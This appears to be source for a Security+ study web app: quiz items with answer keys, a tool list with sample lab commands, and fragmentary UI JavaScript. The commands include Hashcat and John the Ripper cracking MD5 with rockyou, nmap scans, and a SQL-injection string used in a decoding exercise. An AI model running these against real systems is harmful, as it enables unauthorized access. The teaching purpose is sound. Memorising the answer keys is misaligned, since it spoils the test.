tagging"]}]}],"parts":8,"pass":7},{"id":"pbq-data-protect","domain":3,"diff":2,"obj":"3.3","type":"selects","name":"Protecting Data — Methods and States","scenario":"The privacy office lists ten requirements. For rows 1–8 pick the protection method; for rows 9–10 pick the state the data is in.","label":"Answer all ten","objText":"Obj 3.3 – Compare and contrast concepts and strategies to protect data","why":"<ul><li><strong>Masking<\/strong> shows only part of a value (••••4821).<\/li><li><strong>Tokenization<\/strong> replaces the value with a surrogate, with the mapping kept in a vault.<\/li><li><strong>Hashing<\/strong> lets you check a match without ever recovering the original.<\/li><li><strong>Geographic restrictions<\/strong> keep EU data in EU regions (data sovereignty).<\/li><li><strong>Encryption<\/strong> protects a lost laptop.<\/li><li><strong>Permission restrictions<\/strong> limit the salary share to HR.<\/li><li><strong>Segmentation<\/strong> puts cardholder systems on their own VLAN.<\/li><li><strong>Obfuscation<\/strong> makes code hard to read and reverse-engineer.<\/li><li>TLS protects data <strong>in transit<\/strong>; data being worked on in RAM is <strong>in use<\/strong>.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> Support agents see card numbers as <code>•••• •••• •••• 4821<\/code>.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>2.<\/strong> Card numbers are swapped for random values; the mapping back lives only in a secured vault.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>3.<\/strong> Store a value so you can later check whether input matches it, but never recover the original.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>4.<\/strong> EU customer records must never be stored in data centers outside the EU.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>5.<\/strong> A lost laptop's drive must be unreadable without the recovery key.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>6.<\/strong> Only members of the HR group may open the salary share.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>7.<\/strong> Cardholder-data servers go on their own VLAN behind strict ACLs.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>8.<\/strong> The mobile app's code is minified and its variables renamed so it is hard to reverse-engineer.","f":[{"ph":"Method","o":["Encryption","Hashing","Masking","Tokenization","Obfuscation","Geographic restrictions","Segmentation","Permission restrictions"]}]},{"d":"<strong>9.<\/strong> A browser sends a password to the API over TLS 1.3.","f":[{"ph":"State","o":["Data at rest","Data in transit","Data in use"]}]},{"d":"<strong>10.<\/strong> A spreadsheet is open and being edited in the computer's memory.","f":[{"ph":"State","o":["Data at rest","Data in transit","Data in use"]}]}],"parts":10,"pass":8},{"id":"pbq-siem-mfa","domain":4,"diff":3,"obj":"4.9","type":"multi","name":"SIEM Investigation — MFA Push Bombing","scenario":"The SIEM correlated these events for the account <code>jsmith<\/code>. Read them and answer all five questions.","pre":"<span class='d'>time      source  event<\/span>\n<span class='p'>08:01:12<\/span>  VPN     user=jsmith src=73.12.44.9   geo=Denver,US     mfa=approved result=success\n<span class='p'>08:17:40<\/span>  MFA     user=jsmith push #1-#14 <span class='e'>denied<\/span>\n<span class='p'>08:19:02<\/span>  MFA     user=jsmith push #15 <span class='h'>approved<\/span>\n<span class='p'>08:19:05<\/span>  VPN     user=jsmith src=185.220.101.4 geo=Frankfurt,DE mfa=approved result=success\n<span class='p'>08:22:15<\/span>  AD      <span class='h'>jsmith added to group \"Domain Admins\" by jsmith<\/span>\n<span class='p'>08:23:47<\/span>  FW      10.8.4.22 -> 203.0.113.50:443  allow  <span class='e'>bytes_out=2.1GB<\/span>","qs":[{"q":"Q1 — How did the attacker get past MFA?","o":["SIM swapping","Pass-the-hash","MFA fatigue (push bombing)","Session replay"]},{"q":"Q2 — Which indicator shows the 08:19 VPN login is not really jsmith?","o":["Resource consumption","Out-of-cycle logging","Account lockout","Impossible travel"]},{"q":"Q3 — What does the 08:22 event show?","o":["Privilege escalation","Lateral movement","Credential stuffing","A missing log"]},{"q":"Q4 — What does the 08:23 firewall entry most likely show?","o":["DNS tunneling","Data exfiltration","A port scan","Beaconing"]},{"q":"Q5 — Which control would best stop this MFA bypass from working again?","o":["Require longer passwords","Switch the MFA method to SMS codes","Number matching on push approvals","Lock accounts after three failed password attempts"]}],"objText":"Obj 4.9 – Given a scenario, use data sources to support an investigation","why":"<ul><li><strong>Q1:<\/strong> 14 denied pushes followed by an approval is <strong>MFA fatigue / push bombing<\/strong>: the attacker already had the password and spammed prompts until the user gave in.<\/li><li><strong>Q2:<\/strong> Denver and then Frankfurt 18 minutes later is <strong>impossible travel<\/strong>.<\/li><li><strong>Q3:<\/strong> the account adding itself to Domain Admins is <strong>privilege escalation<\/strong>.<\/li><li><strong>Q4:<\/strong> 2.1 GB leaving to an outside address over 443 is <strong>data exfiltration<\/strong>. Beaconing would be small, regular check-ins.<\/li><li><strong>Q5:<\/strong> <strong>number matching<\/strong> makes the user type the number shown at login, so blind approvals stop working. SMS is weaker (SIM swapping), and password rules don't help because the attacker already had the password.<\/li><\/ul>","cards":[["Account","jsmith"],["Normal location","Denver, US"],["Window","08:01–08:24"]],"parts":5,"pass":4},{"id":"pbq-vuln-triage","domain":4,"diff":3,"obj":"4.3","type":"selects","name":"Vulnerability Management — Triage the Scan","scenario":"This week's scan is back. Pick the correct response for each finding (rows 1–5), then answer rows 6–7.<table><tr><th>#<\/th><th>Finding<\/th><th>CVSS<\/th><th>Context<\/th><\/tr><tr><td>1<\/td><td>VPN appliance RCE<\/td><td>9.8<\/td><td>Internet-facing; listed in CISA KEV (actively exploited)<\/td><\/tr><tr><td>2<\/td><td>Apache 2.4.49 path traversal<\/td><td>7.5<\/td><td>Scanner read the banner; <code>httpd -v<\/code> on the box shows 2.4.62<\/td><\/tr><tr><td>3<\/td><td>HMI web server flaw<\/td><td>8.8<\/td><td>Legacy SCADA HMI; vendor out of business; must keep running<\/td><\/tr><tr><td>4<\/td><td>Print server info leak<\/td><td>3.1<\/td><td>Internal only; risk owner signed an exception<\/td><\/tr><tr><td>5<\/td><td>Browser memory bug<\/td><td>6.5<\/td><td>Workstations; patch available; no known exploit<\/td><\/tr><\/table>","label":"Triage all seven","objText":"Obj 4.3 – Explain various activities associated with vulnerability management","why":"<ul><li><strong>1:<\/strong> critical, exposed and actively exploited: <strong>emergency patch<\/strong>.<\/li><li><strong>2:<\/strong> the scanner trusted the banner, but the installed version is fixed: <strong>false positive<\/strong>.<\/li><li><strong>3:<\/strong> no patch will ever come: <strong>compensating control<\/strong> (segment it, restrict access, monitor).<\/li><li><strong>4:<\/strong> low risk with a signed exception from the risk owner: <strong>accept<\/strong>.<\/li><li><strong>5:<\/strong> a moderate flaw, patch available, nothing exploiting it yet: <strong>next patch cycle<\/strong>.<\/li><li><strong>6:<\/strong> logging in to read installed package versions is a <strong>credentialed scan<\/strong>, which gives fewer false positives.<\/li><li><strong>7:<\/strong> the scan said \"safe\" but the host was vulnerable: a <strong>false negative<\/strong>, the more dangerous kind of error.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> VPN appliance RCE, CVSS 9.8, actively exploited.","f":[{"ph":"Response","o":["Emergency patch now","Patch in the next cycle","Compensating control","Accept the risk (exception)","False positive – close it"]}]},{"d":"<strong>2.<\/strong> Apache path traversal flagged from the banner.","f":[{"ph":"Response","o":["Emergency patch now","Patch in the next cycle","Compensating control","Accept the risk (exception)","False positive – close it"]}]},{"d":"<strong>3.<\/strong> SCADA HMI flaw with no patch available.","f":[{"ph":"Response","o":["Emergency patch now","Patch in the next cycle","Compensating control","Accept the risk (exception)","False positive – close it"]}]},{"d":"<strong>4.<\/strong> Internal print server info leak with a signed exception.","f":[{"ph":"Response","o":["Emergency patch now","Patch in the next cycle","Compensating control","Accept the risk (exception)","False positive – close it"]}]},{"d":"<strong>5.<\/strong> Workstation browser bug, patch available.","f":[{"ph":"Response","o":["Emergency patch now","Patch in the next cycle","Compensating control","Accept the risk (exception)","False positive – close it"]}]},{"d":"<strong>6.<\/strong> The scanner logged in to each host to read installed package versions. What kind of scan is that?","f":[{"ph":"Scan type","o":["Non-credentialed scan","Credentialed scan","Passive scan","Penetration test"]}]},{"d":"<strong>7.<\/strong> Last month the scanner reported a server as clean, but it was later breached through a flaw it should have found. What was that result?","f":[{"ph":"Result","o":["True positive","False positive","True negative","False negative"]}]}],"parts":7,"pass":6},{"id":"pbq-data-sources","domain":4,"diff":3,"obj":"4.9","type":"match","name":"Investigation Data Sources — Where Is the Answer?","scenario":"You are leading an investigation and have six questions. Match each question to the data source that answers it most directly. <strong>Tap a question, then tap its data source.<\/strong>","label":"Pair all six","objText":"Obj 4.9 – Given a scenario, use data sources to support an investigation","cols":["Question","Data source"],"lefts":["What exact bytes did the attacker send in the exploit?","Which servers did the phishing email pass through before it reached us?","Which process on the laptop launched powershell.exe with an encoded command?","Was the connection to 203.0.113.50 allowed or blocked at the perimeter?","Which signature matched the exploit attempt?","Which account logged on interactively to the server at 02:00 (Event ID 4624)?"],"rights":["IDS / IPS logs","Operating system security logs","Packet capture","Endpoint (EDR) logs","Email metadata (headers)","Firewall logs"],"why":"<ul><li><strong>Packet capture<\/strong> is the only source that holds the full payload.<\/li><li><strong>Email metadata<\/strong>: the Received headers trace each hop.<\/li><li><strong>Endpoint / EDR logs<\/strong> record process trees and command lines.<\/li><li><strong>Firewall logs<\/strong> record allow or deny decisions.<\/li><li><strong>IDS/IPS logs<\/strong> name the signature that fired.<\/li><li><strong>OS security logs<\/strong> (Windows Security log, 4624 = successful logon) show who logged on.<\/li><\/ul>","parts":6,"pass":5},{"id":"pbq-risk-math","domain":5,"diff":3,"obj":"5.2","type":"multi","name":"Quantitative Risk — Is the Control Worth It?","scenario":"A warehouse management server is worth <strong>$250,000<\/strong>. A ransomware attack would destroy <strong>40%<\/strong> of its value, and one is expected <strong>once every two years<\/strong>. An EDR upgrade costs <strong>$30,000 per year<\/strong> and would cut the expected rate to <strong>once every ten years<\/strong>.","cards":[["Asset value","$250,000"],["Exposure factor","40%"],["ARO now","0.5"],["Control cost","$30,000 / yr"],["ARO with control","0.1"]],"qs":[{"q":"Q1 — What is the single loss expectancy (SLE)?","o":["$50,000","$100,000","$125,000","$250,000"]},{"q":"Q2 — What is the annualized loss expectancy (ALE) today?","o":["$25,000","$100,000","$50,000","$200,000"]},{"q":"Q3 — What is the ALE with the EDR upgrade in place?","o":["$10,000","$5,000","$20,000","$40,000"]},{"q":"Q4 — What is the control's net value per year (ALE before − ALE after − cost)?","o":["$40,000 benefit","$20,000 loss","$30,000 benefit","$10,000 benefit"]},{"q":"Q5 — The company also buys cyber insurance for what risk remains. That remaining risk is called…","o":["Inherent risk","Residual risk","Risk appetite","Risk tolerance"]}],"objText":"Obj 5.2 – Explain elements of the risk management process","why":"<ul><li><strong>SLE<\/strong> = asset value × EF = $250,000 × 0.4 = <strong>$100,000<\/strong>.<\/li><li><strong>ALE<\/strong> = SLE × ARO = $100,000 × 0.5 = <strong>$50,000<\/strong>.<\/li><li>With the control: $100,000 × 0.1 = <strong>$10,000<\/strong>.<\/li><li>Net value = $50,000 − $10,000 − $30,000 = <strong>$10,000 benefit<\/strong> per year, so the control is worth buying.<\/li><li>Risk left after controls is <strong>residual risk<\/strong>. Buying insurance for it is risk <em>transference<\/em>.<\/li><\/ul>","parts":5,"pass":4},{"id":"pbq-governance-docs","domain":5,"diff":2,"obj":"5.1","type":"match","name":"Governance Documents — Name the Document","scenario":"The audit team pulled six excerpts. Match each document type to its excerpt. <strong>Tap a document type, then tap its excerpt.<\/strong>","label":"Pair all six","objText":"Obj 5.1, 5.5 – Security governance documents; audits, attestation and penetration testing","cols":["Document","Excerpt"],"lefts":["Policy","Standard","Procedure","Guideline","Attestation","Rules of engagement"],"rights":["\"Step 1: open a ticket. Step 2: image the drive with a write blocker. Step 3: record the SHA-256 hash in the chain-of-custody form.\"","\"Testers may scan only 10.0.5.0/24, weekdays 18:00–06:00. Denial-of-service attacks are prohibited.\"","\"All company data must be protected according to its classification.\"","\"Staff are encouraged to use a passphrase made of four random words.\"","\"All laptops must use AES-256 full-disk encryption with TPM plus PIN.\"","\"We, the independent auditor, state that the company's controls met the SOC 2 criteria for the year.\""],"why":"<ul><li><strong>Policy:<\/strong> a broad statement of intent from management.<\/li><li><strong>Standard:<\/strong> a mandatory, specific requirement (AES-256, TPM + PIN).<\/li><li><strong>Procedure:<\/strong> numbered steps to follow.<\/li><li><strong>Guideline:<\/strong> \"encouraged\", meaning recommended rather than required.<\/li><li><strong>Attestation:<\/strong> an auditor's formal statement that controls meet a standard.<\/li><li><strong>Rules of engagement:<\/strong> the scope, timing and limits for a penetration test.<\/li><\/ul>","parts":6,"pass":5},{"id":"pbq-privacy-roles","domain":5,"diff":3,"obj":"5.4","type":"selects","name":"Privacy — Data Roles and Legal Concepts","scenario":"A hospital group is preparing for a GDPR audit. Pick the role or concept for each statement.","label":"Answer all eight","objText":"Obj 5.4 – Summarize elements of effective security compliance (privacy); Obj 4.8 legal hold","why":"<ul><li><strong>Data controller:<\/strong> the hospital decides what patient data is collected and why.<\/li><li><strong>Data processor:<\/strong> the payroll provider only acts on the employer's instructions.<\/li><li><strong>Data subject:<\/strong> the person the data is about.<\/li><li><strong>Data owner:<\/strong> the senior person accountable for a data set, who sets its classification.<\/li><li><strong>Data custodian:<\/strong> the administrator who does backups and applies the access rules.<\/li><li><strong>Right to be forgotten:<\/strong> GDPR right to have personal data erased.<\/li><li><strong>Legal hold:<\/strong> keeps data for litigation and overrides normal deletion schedules.<\/li><li><strong>Data sovereignty:<\/strong> data is subject to the laws of the country where it is stored.<\/li><\/ul>","rows":[{"d":"<strong>1.<\/strong> The hospital decides which patient data to collect and what it is used for.","f":[{"ph":"Role","o":["Data custodian","Data processor","Data subject","Data controller","Data owner"]}]},{"d":"<strong>2.<\/strong> A cloud payroll company processes staff records only as the hospital instructs.","f":[{"ph":"Role","o":["Data custodian","Data processor","Data subject","Data controller","Data owner"]}]},{"d":"<strong>3.<\/strong> The patient whose records are stored.","f":[{"ph":"Role","o":["Data custodian","Data processor","Data subject","Data controller","Data owner"]}]},{"d":"<strong>4.<\/strong> The Chief Medical Officer is accountable for the clinical records system and sets its classification.","f":[{"ph":"Role","o":["Data custodian","Data processor","Data subject","Data controller","Data owner"]}]},{"d":"<strong>5.<\/strong> The database administrator runs backups and applies the access controls the owner chose.","f":[{"ph":"Role","o":["Data custodian","Data processor","Data subject","Data controller","Data owner"]}]},{"d":"<strong>6.<\/strong> A former patient asks the hospital to erase all of their personal data.","f":[{"ph":"Concept","o":["Data sovereignty","Data retention","Right to be forgotten","Legal hold"]}]},{"d":"<strong>7.<\/strong> A lawsuit means emails must be kept even though the schedule says to delete them after a year.","f":[{"ph":"Concept","o":["Data sovereignty","Data retention","Right to be forgotten","Legal hold"]}]},{"d":"<strong>8.<\/strong> Records stored in a German data center fall under German law, wherever the company is based.","f":[{"ph":"Concept","o":["Data sovereignty","Data retention","Right to be forgotten","Legal hold"]}]}],"parts":8,"pass":7}],"repo":"https://github.com/Alexander-Maldonado-Pelayo/Security-Bootcamp","toolkit":[{"cat":"recon","name":"Nmap","url":"https://nmap.org/","tag":"Scanner · free","use":"offense","domains":[2,4],"obj":"4.3, 4.4","desc":"The standard network scanner. It finds live hosts, open ports, running services and versions, and can run scripts that check for common weaknesses. Every attack surface review starts here.","try":"nmap -sV -p- 192.168.56.101   # scan your own lab VM"},{"cat":"recon","name":"Wireshark","url":"https://www.wireshark.org/","tag":"Packet analyzer · free","use":"defend","domains":[2,4],"obj":"4.9","desc":"Captures network traffic and decodes hundreds of protocols so you can read them packet by packet. Great for seeing why Telnet, FTP and HTTP are 'insecure': the passwords are right there in the capture.","try":"Filter: http.request or ftp or telnet   then Follow > TCP Stream"},{"cat":"recon","name":"tcpdump","url":"https://www.tcpdump.org/","tag":"Packet capture · CLI · free","use":"defend","domains":[4],"obj":"4.9","desc":"Command-line packet capture built into most Linux systems. Use it on servers without a desktop, then open the .pcap in Wireshark.","try":"sudo tcpdump -i eth0 -w capture.pcap port 53"},{"cat":"recon","name":"dig / nslookup","url":"https://www.isc.org/bind/","tag":"DNS lookup · built in","use":"defend","domains":[2,4],"obj":"4.5","desc":"Query DNS directly. Check a domain's MX, SPF, DKIM and DMARC records (like the email PBQ), and spot DNS poisoning or tunnelling.","try":"dig +short TXT _dmarc.example.com"},{"cat":"recon","name":"Ncat (netcat)","url":"https://nmap.org/ncat/","tag":"Network Swiss-army knife · free","use":"offense","domains":[2,4],"obj":"4.4","desc":"Opens raw TCP/UDP connections. Use it to grab service banners, test if a firewall rule really allows a port, or move a file between two lab VMs.","try":"ncat -v 192.168.56.101 22   # read the SSH banner"},{"cat":"defend","name":"Wazuh","url":"https://wazuh.com/","tag":"SIEM / XDR · open source","use":"defend","domains":[4],"obj":"4.4, 4.9","desc":"A free SIEM and endpoint agent. It collects logs, checks file integrity, scans for vulnerabilities and maps alerts to MITRE ATT&CK. The closest free thing to a real SOC console.","try":"Install the all-in-one VM, add an agent, then fail 10 SSH logins and watch the alert fire"},{"cat":"defend","name":"Security Onion","url":"https://securityonionsolutions.com/","tag":"Threat hunting platform · free","use":"defend","domains":[4],"obj":"4.4, 4.9","desc":"A whole Linux distribution for network security monitoring: Suricata IDS, Zeek, packet capture and dashboards in one install. Ideal for practicing alert triage.","try":"Replay a sample .pcap and triage the alerts in the dashboard"},{"cat":"defend","name":"Suricata","url":"https://suricata.io/","tag":"IDS / IPS · open source","use":"defend","domains":[3,4],"obj":"3.2, 4.5","desc":"A fast network IDS/IPS. Run it on a SPAN port to alert (IDS) or inline to block (IPS). Reading and writing its rules teaches signature-based detection.","try":"suricata -r capture.pcap -l ./logs   # then read logs/fast.log"},{"cat":"defend","name":"Snort","url":"https://www.snort.org/","tag":"IDS / IPS · open source","use":"defend","domains":[3,4],"obj":"3.2, 4.5","desc":"The classic open-source intrusion detection and prevention system from Cisco Talos. Its rule syntax shows up all over the security world.","try":"alert tcp any any -> $HOME_NET 23 (msg:\"Telnet attempt\"; sid:1000001;)"},{"cat":"defend","name":"Sysinternals Suite","url":"https://learn.microsoft.com/en-us/sysinternals/","tag":"Windows triage · free (Microsoft)","use":"defend","domains":[4],"obj":"4.8, 4.9","desc":"Microsoft's toolbox for looking inside Windows. Process Explorer shows what's really running, Autoruns lists everything that starts at boot (where malware hides), and Sysmon logs process and network activity.","try":"Run Autoruns, hide Microsoft entries, and review what's left"},{"cat":"defend","name":"Lynis","url":"https://cisofy.com/lynis/","tag":"Hardening audit · open source","use":"defend","domains":[4],"obj":"4.1","desc":"Audits a Linux or macOS system against hardening best practices and gives a score with fixes. A hands-on way to learn secure baselines.","try":"sudo lynis audit system   # then fix one warning and re-run"},{"cat":"vuln","name":"OpenVAS (Greenbone)","url":"https://www.openvas.org/","tag":"Vulnerability scanner · open source","use":"offense","domains":[4],"obj":"4.3","desc":"A full vulnerability scanner with CVE and CVSS results, like the scan-triage PBQ. Compare a credentialed and non-credentialed scan of the same VM to see the difference.","try":"Scan Metasploitable twice: once with SSH credentials, once without"},{"cat":"vuln","name":"ZAP","url":"https://www.zaproxy.org/","tag":"Web app scanner · free","use":"offense","domains":[2,4],"obj":"2.3, 4.3","desc":"An intercepting proxy and web scanner (formerly OWASP ZAP). It finds SQL injection, XSS and missing security headers, and lets you watch every request your browser makes.","try":"Point the automated scan at DVWA or Juice Shop in your lab"},{"cat":"vuln","name":"Metasploitable 2","url":"https://docs.rapid7.com/metasploit/metasploitable-2/","tag":"Vulnerable practice VM · free","use":"offense","domains":[2,4],"obj":"2.3, 4.3","desc":"A deliberately insecure Linux VM made to be attacked. Keep it on a host-only network, never on the internet, and use it as the target for Nmap, OpenVAS and ZAP.","try":"Import into VirtualBox on a host-only adapter, then: nmap -sV <its IP>"},{"cat":"crypto","name":"OpenSSL","url":"https://www.openssl.org/","tag":"Crypto toolkit · CLI · free","use":"crypto","domains":[1],"obj":"1.4","desc":"Inspect certificates, check what TLS a site supports, create CSRs and hash files. The fastest way to see a certificate's issuer, expiry, key size and signature algorithm.","try":"openssl s_client -connect example.com:443 | openssl x509 -noout -text"},{"cat":"crypto","name":"CyberChef","url":"https://gchq.github.io/CyberChef/","tag":"Encode / decode in the browser · free","use":"crypto","domains":[1,4],"obj":"1.4, 4.9","desc":"The 'Cyber Swiss Army Knife' from GCHQ. Decode Base64, URL encoding and hex, calculate hashes, XOR data and unpack suspicious strings found in logs, all in a browser tab.","try":"Paste a %27%20OR%201=1 log entry and apply 'URL Decode'"},{"cat":"crypto","name":"John the Ripper","url":"https://www.openwall.com/john/","tag":"Password cracker · lab only","use":"offense","domains":[1,2],"obj":"1.4, 2.4","desc":"Cracks password hashes with wordlists and rules. Cracking an unsalted MD5 in seconds, then failing against bcrypt, shows exactly why salting and key stretching matter.","try":"john --format=raw-md5 --wordlist=rockyou.txt hashes.txt   # hashes you made"},{"cat":"crypto","name":"Hashcat","url":"https://hashcat.net/hashcat/","tag":"GPU password cracker · lab only","use":"offense","domains":[1,2],"obj":"1.4, 2.4","desc":"GPU-powered password recovery. Compare how fast it cracks MD5 against bcrypt or PBKDF2 to see key stretching at work.","try":"hashcat -m 0 -a 0 hashes.txt rockyou.txt   # -m 0 = MD5"},{"cat":"crypto","name":"KeePassXC","url":"https://keepassxc.org/","tag":"Password manager · open source","use":"crypto","domains":[1,4],"obj":"4.6","desc":"An offline, encrypted password manager with a built-in password generator and TOTP codes. Practice what you preach: unique, long passwords everywhere.","try":"Create a vault protected by a passphrase and a key file"},{"cat":"crypto","name":"VeraCrypt","url":"https://www.veracrypt.fr/","tag":"Disk encryption · open source","use":"crypto","domains":[1,3],"obj":"1.4, 3.3","desc":"Creates encrypted volumes and full-disk encryption. A hands-on look at protecting data at rest.","try":"Make a 100 MB encrypted container, mount it, and store a test file"},{"cat":"forensics","name":"Autopsy","url":"https://www.autopsy.com/","tag":"Disk forensics · open source","use":"forensics","domains":[4],"obj":"4.8","desc":"A graphical digital forensics platform. Load a disk image and recover deleted files, browse web history and build a timeline of what happened.","try":"Open a sample disk image and run the Recent Activity module"},{"cat":"forensics","name":"FTK Imager","url":"https://www.exterro.com/digital-forensics-software/ftk-imager","tag":"Forensic imaging · free","use":"forensics","domains":[4],"obj":"4.8","desc":"Makes forensic images of drives and memory and records MD5/SHA-1 hashes, so you can prove the evidence wasn't altered (integrity and chain of custody).","try":"Image a USB stick, then compare the hashes it reports"},{"cat":"practice","name":"TryHackMe","url":"https://tryhackme.com/","tag":"Guided labs in the browser · free tier","use":"practice","domains":[1,2,3,4,5],"obj":"All","desc":"Beginner-friendly rooms that run in your browser, with no setup. It has learning paths that line up with Security+ topics, plus SOC and pentest tracks.","try":"Start with the Pre Security or Cyber Security 101 path"},{"cat":"practice","name":"OverTheWire: Bandit","url":"https://overthewire.org/wargames/bandit/","tag":"Linux wargame · free","use":"practice","domains":[4],"obj":"Command line","desc":"Learn the Linux command line by SSH-ing into levels and finding each password. Perfect prep for this site's command-line labs.","try":"ssh bandit0@bandit.labs.overthewire.org -p 2220"},{"cat":"practice","name":"picoCTF","url":"https://picoctf.org/","tag":"Capture the flag · free","use":"practice","domains":[1,2,4],"obj":"CTF skills","desc":"Carnegie Mellon's free CTF platform for beginners: cryptography, web, forensics and general skills challenges, open all year in picoGym.","try":"Solve three General Skills challenges in picoGym"},{"cat":"practice","name":"CyberDefenders","url":"https://cyberdefenders.org/","tag":"Blue-team labs · free tier","use":"practice","domains":[4],"obj":"4.8, 4.9","desc":"Blue-team investigation labs: analyze PCAPs, logs and disk images to answer questions about a real-looking incident.","try":"Pick a beginner network forensics lab and work it in Wireshark"},{"cat":"practice","name":"LetsDefend","url":"https://letsdefend.io/","tag":"SOC analyst simulator · free tier","use":"practice","domains":[4],"obj":"4.4, 4.9","desc":"A simulated SOC: work alerts in a SIEM queue, investigate them and close them as true or false positives, just like a tier 1 analyst.","try":"Work three alerts in the monitoring queue"}],"toolcats":[["recon","🔍 Recon & network analysis","See what's on a network and what it's saying."],["defend","🛡️ Defense & monitoring","Detect, alert and harden. The SOC side of Security+."],["vuln","🧪 Vulnerability & web testing","Lab only: scan and attack targets you own, on an isolated network."],["crypto","🔐 Crypto & passwords","See hashing, salting, certificates and encryption in action."],["forensics","🔬 Forensics","Collect and examine evidence without changing it."],["practice","🎯 Free practice ranges","Hands-on platforms that run in your browser. No lab setup needed."]]}</script>

function startNet() {

  const still = matchMedia('(prefers-reduced-motion: reduce)').matches;
  const P = new Float32Array(E.memory.buffer, E.net_ptr(), 640);
  const L = new Float32Array(E.memory.buffer, E.net_links_ptr(), 6144);
  const BASE = '159,239,0';
  let w = 0, h = 0, dpr = 1, last = 0, tint = BASE, tintUntil = 0;
  const size = first => {
    dpr = Math.min(window.devicePixelRatio || 1, 2);
    w = innerWidth; h = innerHeight;
    c.width = w * dpr; c.height = h * dpr; c.style.width = w + 'px'; c.style.height = h + 'px';
    if (first) E.net_init(Math.max(28, Math.min(130, Math.round(w * h / 16000))), w, h, (Date.now() & 0xffff) + 1);
    else E.net_resize(w, h);
  };
  const frame = t => {
    const dt = Math.min(0.05, (t - last) / 1000 || 0.016); last = t;
    E.net_step(dt);
    const n = E.net_count(), k = E.net_links(135);
    const col = t < tintUntil ? tint : BASE;
    x.setTransform(dpr, 0, 0, dpr, 0, 0);
    x.clearRect(0, 0, w, h);
    x.lineWidth = 1;
    for (let band = 0; band < 3; band++) {            // batch links by strength
      x.strokeStyle = `rgba(${col},${[0.04, 0.09, 0.17][band]})`;
      x.beginPath();
      for (let i = 0; i < k; i++) {
        if (Math.min(2, Math.floor(L[i * 3 + 2] * 3)) !== band) continue;
        const a = L[i * 3] * 4, b = L[i * 3 + 1] * 4;

  mpick: d => { const u = cur(); if (!u || u.done) return; u.pick[+d.q] = +d.v; renderQ(); },
  chip: d => {
    const u = cur(); if (!u || u.done) return; const n = +d.v;
    // With an item in hand, tapping an item that already sits in a zone drops into that zone.
    if (u.sel !== null && u.sel !== n && u.place[n] !== undefined) { u.place[u.sel] = u.place[n]; u.sel = null; }
    else u.sel = u.sel === n ? null : n;
    renderQ();
  },
  zone: d => { const u = cur(); if (!u || u.done || u.sel === null) return; if (+d.v < 0) delete u.place[u.sel]; else u.place[u.sel] = +d.v; u.sel = null; renderQ(); },
  oadd: d => { const u = cur(); if (!u || u.done) return; u.seq.push(+d.v); renderQ(); },
  odel: d => { const u = cur(); if (!u || u.done) return; u.seq.splice(+d.v, 1); renderQ(); },
  mleft: d => { const u = cur(); if (!u || u.done) return; const l = +d.v; if (u.pairs[l] !== undefined) { delete u.pairs[l]; u.sel = l; } else u.sel = u.sel === l ? null : l; renderQ(); },
  mright: d => { const u = cur(); if (!u || u.done || u.sel === null) return; const r = +d.v; Object.keys(u.pairs).forEach(l => { if (u.pairs[l] === r) delete u.pairs[l]; }); u.pairs[u.sel] = r; u.sel = null; renderQ(); },
  reset: (d, el) => {
    if (el.dataset.armed) { S = blank(); save(); home(); toast('Progress cleared'); }
    else { el.dataset.armed = '1'; el.textContent = 'Tap again to erase everything'; setTimeout(() => { if (el.isConnected) { delete el.dataset.armed; el.textContent = 'Reset my progress'; } }, 4000); }
  },
};
document.addEventListener('click', e => {
  const el = e.target.closest('[data-a]');
  if (!el || el.disabled || !E) { const box = e.target.closest('.term'), inp = box && box.querySelector('input'); if (inp && !String(getSelection())) inp.focus({preventScroll: true}); return; }
  const fn = ACT[el.dataset.a];
  if (fn) fn(el.dataset, el);
});
function taskSubmit(i) {
  const u = cur(), inp = $('#ta' + i);
  if (!u || u.done || !inp || !$('#tin')) return;
  const ans = inp.value.trim();
  if (!ans) { inp.focus(); return; }
  shell(`submit ${i + 1} ${ans}`);
  if (u.ok[i]) { delete u.draft[i]; delete u.miss[i]; } else u.miss[i] = ans.slice(0, 40);
  if (R && !R.over) renderQ();
  const next = R && !R.over && !u.done && document.querySelector('.tform input');
  if (next) next.focus({preventScroll: true});
}
function runLab() { if (!cur() || !$('#tin')) return; shell($('#tin').value); if (R && !R.over) renderQ(); }
document.addEventListener('change', e => {
  const t = e.target;
  if (t.id === 'cs') { S.name = t.value.trim().slice(0, 20); save(); hud(); return; }
  if (t.tagName === 'SELECT' && t.dataset.k) {
    const u = cur(); if (!u || u.done) return;
    if (t.value === '') delete u.vals[t.dataset.k]; else u.vals[t.dataset.k] = +t.value;
    const go = $('#go'); if (go && !R.m.exam) go.disabled = !answered(Q[R.qs[R.i]], u);
  }
});
document.addEventListener('input', e => {
  if (e.target.id === 'subflags') SUBDRAFT = e.target.value;
  if (e.target.id === 'refq') { REF.q = e.target.value.slice(0, 60); refRefresh(); }
  if (e.target.dataset && e.target.dataset.t !== undefined) { const u = cur(); if (u && u.draft) u.draft[e.target.dataset.t] = e.target.value; }
  if (e.target.id === 'subname') { S.real = e.target.value.trim().slice(0, 60); save(); }
});
document.addEventListener('keydown', e => {
  if (e.key === 'Enter' && e.target.id === 'cin') { e.preventDefault(); return runCon(e.target.value); }
  if (e.key === 'Enter' && e.target.id === 'tin') { e.preventDefault(); return runLab(); }
  if (e.key === 'Enter' && e.target.dataset && e.target.dataset.t !== undefined) { e.preventDefault(); return taskSubmit(+e.target.dataset.t); }
